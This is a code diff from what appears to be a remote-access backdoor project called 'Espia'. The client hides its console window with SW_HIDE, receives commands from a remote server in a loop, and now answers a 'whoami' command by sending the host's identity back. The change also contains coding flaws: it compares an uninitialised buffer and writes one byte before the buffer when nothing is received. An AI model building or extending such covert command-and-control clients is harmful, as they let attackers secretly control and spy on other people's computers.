@@ -7,6 +7,7 @@
 #include "Espia/includes/espia.h"
 
 #define TRY_SERVER 5
+#define BUFF_SIZE 1024
 
 int main() {
     /* Allocate a new console and hide it (SW_HIDE) */
@@ -26,13 +27,19 @@ int main() {
 
 
     /* Main flow of the program, command recieving, parsing */
-    CHAR buff[256];
-    int cmd_size;
-    while (strcmp(buff, "exit")) {
-        memset(buff, 0, 256);
-        cmd_size = espia_recv(&connection, buff, 256);
-        memset(buff + cmd_size - 1, 0, 1);
-        printf("Server>> %s | Size (%d)\n", buff, cmd_size);
+    CHAR recv_buff[BUFF_SIZE];
+    CHAR send_buff[BUFF_SIZE];
+    memset(send_buff, 0, BUFF_SIZE);
+    int cmd_size = -1;
+    while (strcmp(recv_buff, "exit") || cmd_size != 0) {
+        memset(recv_buff, 0, BUFF_SIZE);
+        cmd_size = espia_recv(&connection, recv_buff, BUFF_SIZE);
+        memset(recv_buff + cmd_size - 1, 0, 1);
+
+        if (strcmp(recv_buff, "whoami") == 0) {
+            whoami(send_buff, BUFF_SIZE);
+            espia_send(&connection, send_buff, BUFF_SIZE);
+        }
     }
     /* ---------------------------------------------------- */
 
